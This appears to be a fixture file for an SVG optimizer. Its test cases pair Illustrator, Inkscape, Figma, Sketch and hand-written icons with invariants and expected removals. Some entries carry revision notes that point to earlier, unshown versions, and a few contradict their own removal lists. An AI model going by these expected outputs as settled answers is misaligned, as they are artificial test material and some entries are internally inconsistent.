name: ai-shield-badge-flat-classes
source: Adobe Illustrator 25.2.1 SVG Export Plug-In (SVG 1.1, flat .st0/.st1 CSS classes)
svg:
<?xml version="1.0" encoding="utf-8"?>
<!-- Generator: Adobe Illustrator 25.2.1, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px"
	 y="0px" viewBox="0 0 64 64" style="enable-background:new 0 0 64 64;" xml:space="preserve">
<style type="text/css">
	.st0{fill:#2B3A67;}
	.st1{fill:#F5A623;}
</style>
<path class="st0" d="M32,2.5459L6.75,11.8018v18.3505c0,15.7182,10.7842,30.4193,25.25,34.1018
	c14.4658-3.6825,25.25-18.3836,25.25-34.1018V11.8018L32,2.5459z"/>
<path class="st1" d="M32,14.6047l4.8541,9.8371l10.8541,1.5773l-7.8541,7.6556l1.8541,10.8098L32,39.3541
	l-9.7082,5.1304l1.8541-10.8098l-7.8541-7.6556l10.8541-1.5773L32,14.6047z"/>
</svg>
invariants: The .st0 rule (fill:#2B3A67) must end up applied to the first (shield) path and the .st1 rule (fill:#F5A623) to the second (star) path -- whether the optimizer keeps the class+style rule or inlines the color as a fill attribute, each shape must still render its correct color.
Both <path> elements and their exact d geometry (coordinates and command letters) must be preserved; no rounding that alters the rendered outline.
The two fill colors #2B3A67 and #F5A623 must survive somewhere that reaches the shapes (rule or attribute); neither class may be dropped as 'unused'.
The rendered raster must be visually identical before and after optimization.
expectedRemovals: The <?xml ...?> prolog
The 'Generator: Adobe Illustrator 25.2.1 ... SVG Export Plug-In' comment
The <!DOCTYPE svg PUBLIC ...> declaration
The unused xmlns:xlink namespace declaration (no xlink: attribute is used)
The version="1.1" attribute
The x="0px" and y="0px" default-zero attributes
The enable-background style inside the style attribute (deprecated, no filter references it)
xml:space="preserve" (there are no text nodes)
id="Layer_1" (never referenced by any url() or href)
Inter-tag whitespace, tab indentation, and the tab-prefixed d-attribute line wraps

name: ai-cloud-upload-svgid-gradient
source: Adobe Illustrator 23.0.1 SVG Export Plug-In (SVG 1.1, linearGradient referenced via SVGID_1_)
svg:
<?xml version="1.0" encoding="utf-8"?>
<!-- Generator: Adobe Illustrator 23.0.1, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px"
	 y="0px" viewBox="0 0 120 120" style="enable-background:new 0 0 120 120;" xml:space="preserve">
<style type="text/css">
	.st0{fill:#FFFFFF;}
</style>
<linearGradient id="SVGID_1_" gradientUnits="userSpaceOnUse" x1="60" y1="8.5" x2="60" y2="111.5">
	<stop  offset="0" style="stop-color:#36D1DC"/>
	<stop  offset="1" style="stop-color:#5B86E5"/>
</linearGradient>
<circle fill="url(#SVGID_1_)" cx="60" cy="60" r="51.5"/>
<path class="st0" d="M60,33.7523l18.4041,18.4041l-6.3640,6.3640L64.5,50.9723v35.2777h-9V50.9723
	l-7.5401,7.5401l-6.3640-6.3640L60,33.7523z"/>
</svg>
invariants: The id SVGID_1_ must survive verbatim and remain referenced: the disc element must keep fill="url(#SVGID_1_)" so the gradient still paints it. The id and its consuming reference must stay in sync -- neither dropped nor renamed out of agreement.

The <linearGradient> element must survive with gradientUnits="userSpaceOnUse" and its coordinates x1=60 y1=8.5 x2=60 y2=111.5 intact, and both <stop>s preserved in order (offset 0 -> stop-color #36D1DC, offset 1 -> stop-color #5B86E5), so the gradient renders identically.
The .st0 rule (fill:#FFFFFF) must end up applied to the arrow path so it renders white (via a surviving rule or an inlined fill attribute).
The disc's position and size (cx=60 cy=60 r=51.5, or an equivalent path) and the arrow path's d geometry must be preserved.
The rendered raster must be visually identical before and after optimization.
expectedRemovals: The <?xml ...?> prolog
The 'Generator: Adobe Illustrator 23.0.1 ... SVG Export Plug-In' comment
The <!DOCTYPE svg PUBLIC ...> declaration
The unused xmlns:xlink namespace declaration (no xlink: attribute is used)
The version="1.1" attribute
The x="0px" and y="0px" default-zero attributes
The enable-background style inside the style attribute
xml:space="preserve" (there are no text nodes)
id="Layer_1" (never referenced, unlike SVGID_1_ which must be kept)
The redundant double space Illustrator emits inside '<stop  offset=...'
Inter-tag whitespace, tab indentation, and the tab-prefixed d-attribute line wrap

name: inkscape-leaf-icon
source: Inkscape 1.0.2 (e86c870879) SVG export, plain SVG, single filled path on one layer
svg:
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg
   xmlns:dc="http://purl.org/dc/elements/1.1/"
   xmlns:cc="http://creativecommons.org/ns#"
   xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
   xmlns:svg="http://www.w3.org/2000/svg"
   xmlns="http://www.w3.org/2000/svg"
   xmlns:sodipodi="http://sodipodi.sourceforge.net/DTD/sodipodi-0.0.dtd"
   xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"
   width="48"
   height="48"
   viewBox="0 0 48 48"
   version="1.1"
   id="svg8"
   inkscape:version="1.0.2 (e86c870879, 2021-01-15)"
   sodipodi:docname="leaf.svg">
  <defs id="defs2" />
  <sodipodi:namedview
     id="base"
     pagecolor="#ffffff"
     bordercolor="#666666"
     borderopacity="1.0"
     inkscape:pageopacity="0.0"
     inkscape:pageshadow="2"
     inkscape:zoom="11.313708"
     inkscape:cx="24.128572"
     inkscape:cy="24.371429"
     inkscape:document-units="px"
     inkscape:current-layer="layer1"
     inkscape:window-width="1920"
     inkscape:window-height="1051"
     inkscape:window-x="0"
     inkscape:window-y="0" />
  <metadata id="metadata5">
    <rdf:RDF>
      <cc:Work rdf:about="">
        <dc:format>image/svg+xml</dc:format>
        <dc:type rdf:resource="http://purl.org/dc/dcmitype/StillImage" />
        <dc:title></dc:title>
      </cc:Work>
    </rdf:RDF>
  </metadata>
  <g
     inkscape:label="Layer 1"
     inkscape:groupmode="layer"
     id="layer1">
    <path
       id="path12"
       d="M 24.041667,4.2333333 C 13.229167,10.583333 7.9375,20.108333 12.170833,32.808333 c 1.5875,4.7625 6.879167,8.466667 11.870834,10.583334 C 19.579167,33.866667 22.220833,22.754167 35.983333,14.816667 30.691667,20.108333 25.4,25.929167 27.516667,38.629167 33.866667,32.808333 40.216667,23.283333 35.983333,12.170833 33.866667,6.8791667 28.804167,5.2916667 24.041667,4.2333333 Z"
       style="fill:#3a7d2c;fill-opacity:1;stroke:none" />
  </g>
</svg>
invariants: The single <path> element (id path12) must survive with its d attribute geometry untouched: every M/C/c command, all coordinates, and the mix of absolute (C) and relative (c) segments preserved exactly, and the trailing Z close command kept.
The path's visible fill color #3a7d2c must be preserved (fill:none is NOT acceptable); the leaf must still render as the same green shape.
viewBox="0 0 48 48" plus width/height must be preserved so the drawing renders at the same size and position.
Rendered output must be pixel-identical to the input: same leaf silhouette, same green fill.
expectedRemovals: The entire <sodipodi:namedview id="base"> element (pagecolor, zoom, window geometry, current-layer) is editor state and should be dropped.
The entire <metadata id="metadata5"> block including rdf:RDF, cc:Work, dc:format, dc:type, dc:title.
The editor namespace declarations xmlns:sodipodi, xmlns:inkscape, xmlns:dc, xmlns:cc, xmlns:rdf (and redundant xmlns:svg) once their consumers are gone.
Root attributes inkscape:version and sodipodi:docname.
inkscape:label and inkscape:groupmode="layer" on the <g> (the group itself may be unwrapped or kept, but these editor attributes must go).
The empty <defs id="defs2" /> element.
Optionally the now-unused id attributes (svg8, defs2, base, metadata5, layer1, path12) and the XML declaration / standalone flag.

name: inkscape-check-badge
source: Inkscape 1.1 (c68e22c387) SVG export, plain SVG, a <circle> and a checkmark <path> on one layer, authored metadata with dc:creator
svg:
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg
   xmlns:dc="http://purl.org/dc/elements/1.1/"
   xmlns:cc="http://creativecommons.org/ns#"
   xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
   xmlns:svg="http://www.w3.org/2000/svg"
   xmlns="http://www.w3.org/2000/svg"
   xmlns:sodipodi="http://sodipodi.sourceforge.net/DTD/sodipodi-0.0.dtd"
   xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"
   width="64"
   height="64"
   viewBox="0 0 64 64"
   version="1.1"
   id="svg8"
   inkscape:version="1.1 (c68e22c387, 2021-05-23)"
   sodipodi:docname="badge.svg">
  <sodipodi:namedview
     id="namedview7"
     pagecolor="#ffffff"
     bordercolor="#999999"
     borderopacity="1"
     inkscape:showpageshadow="2"
     inkscape:pageopacity="0.0"
     inkscape:pagecheckerboard="0"
     inkscape:deskcolor="#d1d1d1"
     inkscape:document-units="px"
     showgrid="false"
     inkscape:zoom="7.375"
     inkscape:cx="32.135593"
     inkscape:cy="31.932203"
     inkscape:window-width="1440"
     inkscape:window-height="847"
     inkscape:window-x="0"
     inkscape:window-y="25"
     inkscape:window-maximized="1"
     inkscape:current-layer="layer1" />
  <defs id="defs2" />
  <metadata id="metadata5">
    <rdf:RDF>
      <cc:Work rdf:about="">
        <dc:format>image/svg+xml</dc:format>
        <dc:type rdf:resource="http://purl.org/dc/dcmitype/StillImage" />
        <dc:title>badge</dc:title>
        <dc:creator>
          <cc:Agent>
            <dc:title>Jayden Yoon ZK</dc:title>
          </cc:Agent>
        </dc:creator>
      </cc:Work>
    </rdf:RDF>
  </metadata>
  <g
     inkscape:label="Layer 1"
     inkscape:groupmode="layer"
     id="layer1">
    <circle
       id="path834"
       style="fill:#1f6feb;fill-opacity:1;stroke:none"
       cx="32.101695"
       cy="32.033898"
       r="27.457628" />
    <path
       id="path938"
       style="fill:#ffffff;fill-opacity:1;stroke:none"
       d="M 27.152542,42.305085 17.898305,33.050847 21.966102,28.983051 27.152542,34.169492 42.033898,19.288136 46.101695,23.355932 Z" />
  </g>
</svg>
invariants: The <circle> (id path834) must survive with its high-precision cx="32.101695", cy="32.033898", r="27.457628" geometry untouched and its fill color #1f6feb preserved.
The checkmark <path> (id path938) must survive with its d attribute geometry untouched (all M/L implicit lineto coordinates and the trailing Z) and its fill color #ffffff preserved.
Paint (stroke:none) must not become a visible stroke, and neither fill may be dropped or changed to none.
Document order must be preserved so the circle stays behind and the white check stays on top; viewBox="0 0 64 64" and width/height kept so it renders at the same scale.
Rendered output must be pixel-identical: blue disc with a white check in the same positions.
expectedRemovals: The entire <sodipodi:namedview id="namedview7"> element (page/desk colors, zoom, window geometry, showgrid, current-layer).
The entire <metadata id="metadata5"> block including rdf:RDF, cc:Work, dc:format, dc:type, dc:title, and the dc:creator / cc:Agent author name.
The editor namespace declarations xmlns:sodipodi, xmlns:inkscape, xmlns:dc, xmlns:cc, xmlns:rdf (and redundant xmlns:svg) once nothing references them.
Root attributes inkscape:version and sodipodi:docname.
inkscape:label and inkscape:groupmode="layer" on the layer <g> (the group may be flattened or kept, but the editor attributes must go).
The empty <defs id="defs2" /> element.
Optionally the unused id attributes (svg8, namedview7, defs2, metadata5, layer1, path834, path938) and the XML declaration / standalone flag.

name: figma-avatar-icon-clip
source: Figma SVG export (24x24 avatar icon, clipPath + evenodd)
svg:
<svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
<g clip-path="url(#clip0_412_1580)">
<rect width="24" height="24" rx="12" fill="#EEF2FF"/>
<path fill-rule="evenodd" clip-rule="evenodd" d="M12 12C14.2091 12 16 10.2091 16 8C16 5.79086 14.2091 4 12 4C9.79086 4 8 5.79086 8 8C8 10.2091 9.79086 12 12 12ZM12 14C8.68629 14 6 16.6863 6 20V22H18V20C18 16.6863 15.3137 14 12 14Z" fill="#4F46E5"/>
</g>
<defs>
<clipPath id="clip0_412_1580">
<rect width="24" height="24" fill="white"/>
</clipPath>
</defs>
</svg>
invariants: clipPath id "clip0_412_1580" must survive: the <g> references it via clip-path="url(#clip0_412_1580)", so the id and its clipPath definition must remain live after optimization. (CORRECT as-is)
The person <path> 'd' geometry (both subpaths: the head circle centered (12,8) r=4, and the torso from y=14 to y=22) must be preserved unchanged - do not merge, reorder, or re-round the coordinates.
Fill colors must be preserved: rect fill="#EEF2FF", rect rx="12" (rounded background), and path fill="#4F46E5".
Visual render must be pixel-identical: rounded-rect indigo-tinted background with the indigo person glyph on top. (CORRECT as-is)

CORRECTED invariant replacing #3: fill-rule="evenodd" on the person path is a visual no-op for THIS artwork because its two subpaths are disjoint (head y in [4,12], torso y in [14,22], 2-unit gap) - evenodd and nonzero render identically. Keeping it is harmless and matches Figma output, but it is NOT load-bearing and there is no overlap/donut effect. Do not assert that dropping it changes rendering.

CORRECTED classification replacing #4: clip-rule="evenodd" on the person path is inert (the path is a painted child of <g>, not a clipPath child; clip-rule only affects clip geometry, never solid fill). Move it from invariants to expectedRemovals - it can be dropped with no rendering change.
expectedRemovals: xmlns:xlink is absent so nothing to strip there, but redundant fill="none" on root <svg> may be dropped only if rendering is unchanged
the clipPath's inner <rect fill="white"> fill attribute is inert for clipping and may be dropped (clip geometry ignores fill)
whitespace/newlines between elements can be collapsed
if the optimizer proves the <g clip-path> clip is a no-op because content is within bounds it could inline children, but the safe expectation is it keeps the clip and its id

name: sketch-badge-mask-rect
source: Sketch 96 SVG export (32x32 badge, mask + clipPath, evenodd checkmark)
svg:
<svg width="32" height="32" viewBox="0 0 32 32" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<title>badge/verified</title>
<defs>
<rect id="path-mask0" x="0" y="0" width="32" height="32" rx="16"/>
<mask id="mask0_2_9" x="0" y="0" width="32" height="32" fill="white">
<use xlink:href="#path-mask0"/>
</mask>
<clipPath id="clip0_2_9">
<use xlink:href="#path-mask0"/>
</clipPath>
</defs>
<g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
<g clip-path="url(#clip0_2_9)">
<rect fill="#16A34A" x="0" y="0" width="32" height="32" rx="16"/>
<use stroke="#BBF7D0" mask="url(#mask0_2_9)" stroke-width="2" xlink:href="#path-mask0"/>
<path d="M9 16.5L14 21.5L23 11.5" stroke="#FFFFFF" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
</g>
</g>
</svg>
invariants: ADD invariant: `fill="none"` on the outer wrapper <g> must be preserved because the stroked <use xlink:href="#path-mask0"> sets no fill of its own and inherits fill="none"; removing it makes the <use> fill with the default black, which (through mask0_2_9) covers the badge in black. Move fill="none" out of expectedRemovals into invariants.

FIX invariant[3]: `fill-rule="evenodd"` on the outer <g> is visually inert in this SVG (no compound or self-intersecting filled paths exist), so its removal would not change rendering. It may be preserved by convention but must not be asserted as render-load-bearing; do not treat an optimizer that drops it as violating the fixture.

CONFIRMED-correct invariants (hold as written): clip0_2_9 survives (inner <g> clip-path), mask0_2_9 survives (<use> mask=), path-mask0 survives (3 xlink:href refs), the <mask>+child <use> must be preserved (masks the outer half of the 2px inner-ring stroke), xmlns:xlink retained (xlink:href still in use), checkmark path d + stroke-linecap/linejoin round preserved (arc-free M/L polyline).

CONFIRMED-correct expectedRemovals: <title>, version="1.1", stroke="none"/stroke-width="1" defaults on outer <g>, inter-element whitespace, and the SVG2 href-rewrite-then-drop-xmlns:xlink note are all validly removable without render change.
expectedRemovals: <title>badge/verified</title> may be removed if the optimizer strips metadata (it is not referenced and not required for rendering)
version="1.1" attribute on <svg> may be dropped
stroke="none" stroke-width="1" on the outer <g> are redundant defaults that may be dropped without visual change
fill="none" on the outer <g> can be dropped only if no descendant relies on inheriting it (children set their own fill), so it is a candidate but must not change rendering
whitespace/newlines between elements can be collapsed
if xlink:href were rewritten to href per SVG2 the xmlns:xlink could then be removed, but not before

name: lean-search-icon
source: Hand-written 24x24 stroke icon (Feather/Lucide-style), already minified
svg: <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="7"/><path d="M21 21l-4.3-4.3"/></svg>
invariants: Replace invariant #8 with a render-equivalence form: 'path must draw the same stroke: subpath starts at absolute (21,21) and ends at (16.7,16.7), i.e. a relative -4.3,-4.3 lineto. An optimizer MAY normalize the command syntax (e.g. first moveto M->m, and dropping the explicit l since a lineto is implicit after moveto) as long as both endpoints are unchanged. Do NOT require the literal "M21 21l-4.3-4.3" string or the explicit uppercase M / lowercase l letters.'

Add invariant: 'Root attribute ORDER is not significant; an optimizer may reorder svg attributes (e.g. move stroke-width or viewBox to the end) without breaking equivalence. Checkers must compare the set of attribute name/value pairs, not their source order.'

Reword expectedRemovals: 'none - no elements or attributes are removed (measured ~0.8% under SVGO default). Permitted equivalence-preserving normalizations are path-command rewriting (M->m, implicit lineto) and attribute reordering, NOT whitespace normalization (the input has no inter-tag whitespace).'
expectedRemovals: none — the icon is already minimal; the optimizer may at most normalize insignificant whitespace between tags, and total byte savings should be under ~5%

name: lean-monogram-logo
source: Hand-written minimal monogram logo, filled shapes on a rounded square, already lean
svg: <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" role="img" aria-label="JY monogram"><title>JY monogram</title><rect width="48" height="48" rx="10" fill="#abcf37"/><path d="M18 14v13a4 4 0 0 1-4 4h-2" fill="none" stroke="#1a1a1a" stroke-width="3" stroke-linecap="round"/><path d="M27 14l4 7 4-7m-4 7v10" fill="none" stroke="#1a1a1a" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg>
invariants: xmlns='http://www.w3.org/2000/svg' preserved — CONFIRMED present, required for standalone rendering.
viewBox='0 0 48 48' preserved exactly — CONFIRMED present.
role='img' and aria-label='JY monogram' preserved — CONFIRMED both present; valid accessibility contract.
<title>JY monogram</title> preserved with exact text — CONFIRMED present as first child.
fill='#abcf37' on rect preserved verbatim — CONFIRMED; pairs ab/cf/37 are not repeated-digit, so 3-digit shorthand is impossible (verified programmatically).
rx='10' on rect preserved — CONFIRMED present.
fill='none' on both letter paths preserved — CONFIRMED on both; removing it would flood the stroked glyphs with the default black fill.
stroke='#1a1a1a', stroke-width='3', stroke-linecap='round' survive on both paths — CONFIRMED present on both.
stroke-linejoin='round' on the Y path survives — CONFIRMED present only on the Y path (the J path deliberately omits it and relies on default miter; a noop optimizer must not add one).
J path 'd' keeps lowercase relative commands and the arc segment 'a4 4 0 0 1 -4 4' with '0 0 1' intact and unreordered — CONFIRMED; commands present are M v a h (Y path uses M l m v).
rendered raster pixel-identical before/after — reasonable noop expectation; nothing in this SVG forces a rendering-changing rewrite.
no new id/class/style attributes introduced — CONFIRMED none present to begin with.
ADD (implied, worth stating): both #1a1a1a and #abcf37 are un-shortenable, so a correct optimizer performs a true noop (byte delta ~0%), since there is also no inter-tag whitespace to strip.
expectedRemovals: none of substance — hex colors #abcf37 and #1a1a1a are already 6-digit and cannot be safely shortened to 3-digit equivalents; the optimizer may at most trim insignificant inter-tag whitespace, with total byte savings under ~5%

name: orbiting-loader-spinner
source: Hand-authored inline SVG loading spinner (React component icon)
svg:
<svg xmlns="http://www.w3.org/2000/svg" width="120" height="120" viewBox="0 0 120 120">
  <title>Loading</title>
  <desc>Rotating dashed ring with a pulsing core</desc>
  <g fill="none" stroke="#abcf37" stroke-width="6" stroke-linecap="round">
    <circle cx="60" cy="60" r="44" stroke-dasharray="70 210" opacity="0.9">
      <animateTransform attributeName="transform" type="rotate" from="0 60 60" to="360 60 60" dur="1.4s" repeatCount="indefinite"/>
    </circle>
    <circle cx="60" cy="60" r="22" stroke="#2b2b2b" stroke-width="4">
      <animate attributeName="r" values="22;26;22" dur="1.1s" begin="0s" repeatCount="indefinite"/>
      <animate attributeName="opacity" values="1;0.4;1" dur="1.1s" repeatCount="indefinite"/>
    </circle>
  </g>
</svg>
invariants: Both <circle> elements are preserved (outer r=44 dashed ring and inner r=22 core).
The <animateTransform> on the outer circle is preserved with type="rotate", from="0 60 60", to="360 60 60", dur="1.4s", repeatCount="indefinite".

Both <animate> elements on the inner circle are preserved, including the values lists "22;26;22" (attributeName="r") and "1;0.4;1" (attributeName="opacity"), each with dur="1.1s" and repeatCount="indefinite".

begin="0s" on the first inner <animate> may be dropped because it equals the SMIL default begin offset of 0; the <animate> element itself must survive and stay synchronized with the second (which already omits begin).

The separator between the two numbers in stroke-dasharray="70 210" must be preserved so the value remains two numbers (70 and 210); it must not be collapsed into a single number. The separator character may be a space or a comma (equivalent), so a space→comma substitution is a permissible no-op rather than a violation.

Rendered animated result is visually identical (title/desc are non-rendering metadata and may be stripped; inter-element whitespace/newlines are insignificant and may be collapsed since there is no xml:space="preserve" and no text content).
expectedRemovals: The <title> and <desc> elements may be stripped (metadata, not animation)
Redundant default begin="0s" attribute may be removed
Whitespace/newlines between elements collapsed

name: comet-motion-path-badge
source: Figma SVG export, motion added by hand for a hero badge
svg:
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="120" viewBox="0 0 200 120">
  <defs>
    <path id="trackPath" d="M20,90 C60,10 140,10 180,90" fill="none"/>
    <linearGradient id="cometFill" x1="0" y1="0" x2="1" y2="0">
      <stop offset="0" stop-color="#7cf6d0"/>
      <stop offset="1" stop-color="#abcf37"/>
    </linearGradient>
  </defs>
  <use href="#trackPath" stroke="#1d2b1f" stroke-width="2" stroke-dasharray="3 5"/>
  <circle r="7" fill="url(#cometFill)">
    <animateMotion dur="3s" begin="0.2s" repeatCount="indefinite" rotate="auto">
      <mpath href="#trackPath"/>
    </animateMotion>
    <animate attributeName="r" values="7;4;7" dur="3s" begin="0.2s" repeatCount="indefinite"/>
  </circle>
</svg>
invariants: The <path id="trackPath"> in <defs> is preserved with its id intact, because both <use href="#trackPath"> and <mpath href="#trackPath"> reference it (verified: exactly one id="trackPath", two #trackPath references).

The geometry of the path d="M20,90 C60,10 140,10 180,90" is preserved so the rendered curve is identical; coordinate formatting may be normalized to an equivalent form (comma/space, absolute/relative) per expectedRemovals, but the resulting single cubic Bezier, its start point, and its direction must be unchanged because it drives both the <use> stroke and the animateMotion path.

The fill="none" on <path id="trackPath"> is preserved, because the path is rendered through <use href="#trackPath"> as a stroked track; dropping fill="none" would fill the curve with the default black and visibly change the result.
The <animateMotion> element is preserved with dur="3s", begin="0.2s", repeatCount="indefinite", rotate="auto".
The child <mpath href="#trackPath"/> inside <animateMotion> is preserved and its href still resolves to the surviving path id.
The sibling <animate> on r with values="7;4;7", dur="3s", begin="0.2s", repeatCount="indefinite" is preserved.
The linearGradient id="cometFill" (with both stops) is preserved because <circle fill="url(#cometFill)"> references it (verified: one id="cometFill", one url(#cometFill) reference).
Rendered animated result is visually identical.
expectedRemovals: Whitespace/indentation between elements may be collapsed
No structural elements may be removed; the only safe changes are whitespace normalization and equivalent numeric/attribute formatting

name: connector-diagram-xlink-refs
source: Hand-authored SVG mimicking a Sketch/hand-coded connector diagram export
svg:
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 240 160" width="240" height="160">
  <defs>
    <linearGradient id="g1" x1="0" y1="0" x2="1" y2="1">
      <stop offset="0" stop-color="#abcf37"/>
      <stop offset="1" stop-color="#5c7a12"/>
    </linearGradient>
    <radialGradient id="g2" cx="0.5" cy="0.4" r="0.6">
      <stop offset="0" stop-color="#ffffff"/>
      <stop offset="1" stop-color="#d9e6a0"/>
    </radialGradient>
    <filter id="f1" x="-20%" y="-20%" width="140%" height="140%">
      <feGaussianBlur in="SourceAlpha" stdDeviation="2"/>
      <feOffset dy="2" result="o"/>
      <feMerge><feMergeNode in="o"/><feMergeNode in="SourceGraphic"/></feMerge>
    </filter>
    <pattern id="p1" width="8" height="8" patternUnits="userSpaceOnUse">
      <rect width="8" height="8" fill="#f4f1e6"/>
      <circle cx="2" cy="2" r="1" fill="#abcf37"/>
    </pattern>
    <marker id="arrow" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
      <path d="M0,0 L6,3 L0,6 Z" fill="#5c7a12"/>
    </marker>
    <circle id="shape1" cx="0" cy="0" r="14" fill="url(#g2)" stroke="#5c7a12"/>
    <rect id="unused1" x="0" y="0" width="10" height="10" fill="#000000"/>
  </defs>
  <rect x="0" y="0" width="240" height="160" fill="url(#p1)"/>
  <rect x="20" y="40" width="120" height="60" rx="8" fill="url(#g1)" filter="url(#f1)"/>
  <use xlink:href="#shape1" x="180" y="70"/>
  <line x1="146" y1="70" x2="164" y2="70" stroke="#5c7a12" stroke-width="3" marker-end="url(#arrow)"/>
</svg>
invariants: id="g1" must survive: referenced directly by the rounded rect fill="url(#g1)"
id="g2" must survive: referenced transitively via fill="url(#g2)" on <circle id="shape1">, which is itself instantiated by <use>
id="f1" must survive: referenced by filter="url(#f1)" on the rounded rect
id="p1" must survive: referenced by the full-canvas background rect fill="url(#p1)"
id="arrow" must survive: referenced by marker-end="url(#arrow)" on the <line>
id="shape1" must survive: referenced by <use xlink:href="#shape1">
The xlink:href reference form must be recognized as a reference (not only the plain href form); dropping shape1 because only href was scanned would be a bug
The optimizer must follow transitive references: g2 is only reachable through shape1, which is only reachable through <use>, so pruning must not treat g2 as orphaned
Rendered output must be visually identical after optimization (same fills, filter, pattern tiling, marker, and use instance)
expectedRemovals: The <rect id="unused1"> element in <defs> (id "unused1" is never referenced by any url(#...), href, or xlink:href) can be removed entirely

name: badge-plain-href-refs
source: Hand-authored SVG mimicking a hand-coded logo/badge with a plain href <use>
svg:
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 200 200" width="200" height="200">
  <defs>
    <linearGradient id="g1" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0" stop-color="#2b8a3e"/>
      <stop offset="1" stop-color="#154a20"/>
    </linearGradient>
    <radialGradient id="ring" cx="0.5" cy="0.5" r="0.5">
      <stop offset="0.7" stop-color="#8ce99a" stop-opacity="0"/>
      <stop offset="1" stop-color="#2b8a3e"/>
    </radialGradient>
    <filter id="f1">
      <feDropShadow dx="0" dy="2" stdDeviation="3" flood-color="#000000" flood-opacity="0.3"/>
    </filter>
    <pattern id="p1" width="10" height="10" patternUnits="userSpaceOnUse" patternTransform="rotate(45)">
      <line x1="0" y1="0" x2="0" y2="10" stroke="#154a20" stroke-width="2"/>
    </pattern>
    <marker id="arrow" markerWidth="10" markerHeight="10" refX="7" refY="3" orient="auto" markerUnits="strokeWidth">
      <path d="M0,0 L7,3 L0,6 Z" fill="#154a20"/>
    </marker>
    <path id="shape1" d="M0,-10 L3,-3 L10,0 L3,3 L0,10 L-3,3 L-10,0 L-3,-3 Z" fill="url(#ring)"/>
    <text id="unused-label" x="0" y="0" font-size="12">draft</text>
  </defs>
  <circle cx="100" cy="100" r="80" fill="url(#g1)" filter="url(#f1)"/>
  <circle cx="100" cy="100" r="80" fill="url(#p1)" opacity="0.15"/>
  <use href="#shape1" transform="translate(100 100) scale(2.2)"/>
  <path d="M40,150 Q100,180 160,150" fill="none" stroke="#8ce99a" stroke-width="4" marker-end="url(#arrow)"/>
</svg>
invariants: id="g1" must survive: referenced by the base <circle> fill="url(#g1)"
id="ring" must survive: referenced transitively via fill="url(#ring)" on <path id="shape1">, which is instantiated by <use>
id="f1" must survive: referenced by filter="url(#f1)" on the base <circle>
id="p1" must survive: referenced by the overlay <circle> fill="url(#p1)"
id="arrow" must survive: referenced by marker-end="url(#arrow)" on the bottom <path>
id="shape1" must survive: referenced by <use href="#shape1"> (plain href, no xlink namespace)
The plain href reference form must be recognized (this fixture deliberately uses href, not xlink:href); pruning shape1 here would be a bug
The optimizer must follow transitive references: ring is only reachable through shape1, which is only reachable through <use>
The text content "draft" inside the removable element is the only text node; any text-preservation logic must not keep the node alive on that basis since the id is unreferenced
Rendered output must be visually identical after optimization
expectedRemovals: The <text id="unused-label">draft</text> element in <defs> (id "unused-label" is never referenced anywhere) can be removed entirely

name: text-xmlspace-monospace-status
source: Hand-authored terminal-style status widget (monospace SVG dashboard label)
svg:
<svg xmlns="http://www.w3.org/2000/svg" width="480" height="120" viewBox="0 0 480 120">
  <!-- terminal status widget -->
  <rect x="0" y="0" width="480" height="120" fill="#0d1b2a" stroke="none"/>
  <text x="24" y="48" xml:space="preserve" font-family="'Courier New', monospace" font-size="18" fill="#e0e1dd" fill-opacity="1">STATUS:   ONLINE   </text>
  <text x="24" y="84" xml:space="preserve" font-family="'Courier New', monospace" font-size="18" fill="#8ecae6"> load  avg    0.42</text>
</svg>
invariants: font-family="'Courier New', monospace" MUST be preserved on both text elements, and the multi-word family name 'Courier New' MUST remain quoted (single or double quotes are equally valid); dropping the quotes entirely would break parsing of the family name.
expectedRemovals: The XML comment <!-- terminal status widget -->
stroke="none" on the <rect> (the default stroke value)
fill-opacity="1" on the first <text> (the default opacity)
x="0" and y="0" on the <rect> (default coordinates)
Indentation and newline whitespace BETWEEN elements (this whitespace is outside any <text> content and is not rendered)

name: text-tspan-dxdy-wordmark
source: Hand-authored serif wordmark with a trademark superscript and tagline built from dx/dy-offset tspans
svg:
<svg xmlns="http://www.w3.org/2000/svg" width="360" height="140" viewBox="0 0 360 140">
  <!-- wordmark with trademark and tagline -->
  <text x="40" y="70" font-family="Georgia, 'Times New Roman', serif" font-size="32" font-weight="normal" fill="#2b2d42" xml:space="preserve">Hello   World<tspan dx="6" dy="-14" font-size="16" fill="#ef233c">TM</tspan><tspan dx="4" dy="14" font-size="16"> now  shipping </tspan></text>
</svg>
invariants: The <text> element MUST retain xml:space="preserve"; without it the internal whitespace collapses and the words re-space.
